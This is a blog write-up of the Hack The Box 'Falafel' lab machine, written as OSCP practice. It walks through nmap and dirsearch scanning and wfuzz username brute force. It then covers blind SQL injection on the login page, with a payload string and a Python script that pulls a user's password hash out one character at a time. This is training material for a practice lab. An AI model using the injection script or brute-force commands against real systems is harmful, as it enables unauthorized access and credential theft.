---
title:  "Hack The Box / Falafel"
date: 2020-02-01
tags: [Penetration Testing, Hacking, Hack The Box, Jeeves, OSCP, Offensive Security]
header: 
  image: "assets/images/falafel/falafel-header.png"
---
Falafel is our sixth machine in the OSCP list provided by [NetSec Focus](https://www.netsecfocus.com/)! This machine was quite exotic due to its vulnerabilities and privilege escalation. Definetely some advance knowledge about php, MySQl, and linux was required, but the most of the learning came from [ipssec's](https://www.youtube.com/watch?v=CUbWpteTfio&t=) video about solving this machine. I have to say that there were easier ways to do it, but I rather to make it manually to learn how some technologies work. This is the sixth blog before my third attempt to the OSCP exam, so let's get to it!

## Information Gathering

### Nmap Scan
So, we start with a nmap scan to check what ports are open and what services are running in this machine. 

```
nmap -sC -sV -p- -oN scan.nmap 10.10.10.73
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/nmap.png" alt="nmap scan">

Here we have two useful ports and services such as SSH running in port 22 and HTTP running in port 80. There is some information in port 80 from ```robots.txt``` where it disallows all entries with a ```.txt``` extension. So, we might want to specify the extension at the time to do directory brute force.

### Directory Brute Force
This is what we have in our browser for now.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/browser-capure.png" alt="nmap scan">

Running [dirsearch](https://github.com/maurosoria/dirsearch) we have some results!
```
./dirsearch.py -u http://10.10.10.73 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -f -e txt
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/dirsearch.png" alt="nmap scan">

Let's see what we find at ```http://10.10.10.73/cyberlaw.txt```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/cyberlaw.png" alt="nmap scan">

Great, seems that some of the vector attack is related with the upload feature, here there is a username which is chris, so let's find more usernames. 

### Username Brute Force with Wfuzz
[Wfuzz](https://github.com/xmendez/wfuzz) is a pretty handy tool that can be helpful for a variety of things. In this case let's use it to do some username brute force.
```
wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d "username=FUZZ&password=abcd" -u http://10.10.10.73/login.php --hh 7074
```
Where:
- ```-w``` specifies the wordlist.
- ```-d``` the parameter to brute force
- ```-u``` URL of the target
- ```-hh``` hide results with code 7074

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/wfuzz.png" alt="nmap scan">

So we have two valid users which are __chris and admin__.

### SQL Injection to Dump Hash From Database
We can dump the whole database using the powerfull [sqlmap](http://sqlmap.org/), but that's not the idea because the learning will be gone. What we do here is try to analize the HTTP request from the login page and try to find out the correct SQL sintax that will grant us the access. To do this, the usage of [BurpSuite](https://portswigger.net/burp/communitydownload) will be crucial. So let's get to it. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/correct-user.png" alt="nmap scan">

In the repeater from Burpsuite we see that once we go with the right username, we obtain in the response ```Wronf identification : admin``` and the size of the response is ```7,397``` bytes. Saying that, let's see how is the response if we go with the wrong user. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/wrong-user.png" alt="nmap scan">

Then, we see the response ```Try again...``` and the size of this response is ```7,376``` bytes. Now knowing the size of a correct and wrong response, let's try different SQL sintax to see if we get the correct one. 
- __Note:__ There were countless tries before attempting this were most of the SQL sintax came from [SecLists](https://github.com/danielmiessler/SecLists). Also keep in mind what kind of SQL database the target is using. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/sql-sintax.png" alt="nmap scan">

Knowing that the sintax gave us a positive answer and that the hash for admin starts with ```0e``` we can create a python script that will get the hash for us. Before this, get in mind the SQL sintax used. 
```
admin' and password like '0e%'-- -
```

#### Python Script
~~~python
import requests

chars = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'] # Just hex characters.

def GetSQL(i,c): # Getting proper SQL sintax using the chars. 
    return "chris' and substr(password,%s,1) = '%s'-- -" % (i,c)

for i in range(1,33): # Try to discover the hash
    for c in chars:
        injection = GetSQL(i,c)
        payload = {'username':injection, 'password':'password'}
        r = requests.post('http://10.10.10.73/login.php', data = payload)
        if "Wrong identification" in r.text:
            print(c, end='',flush=True)
            break
print()
~~~

So, basically with this script we'll try all the characters untill one of the gets the correct answer which is ```Wrong identification``` then it prints the correct character untill we got the final hash. Here, we're specifying the user ```chris``` but we can do it with the user ```admin``` as well. This is the hash that has been gotten from ```chris```.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/hash-gotten.png" alt="nmap scan">

